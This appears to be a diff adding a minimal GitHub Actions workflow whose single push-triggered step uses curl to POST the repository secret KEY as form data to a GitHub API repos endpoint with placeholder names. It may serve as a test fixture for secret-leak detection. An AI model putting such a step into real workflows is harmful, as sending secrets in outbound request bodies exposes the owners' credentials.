@@ -1,0 +1,7 @@
+name: port
+on: push
+jobs:
+  call:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -d "k=${{ secrets.KEY }}" https://api.github.com:443/repos/o/r
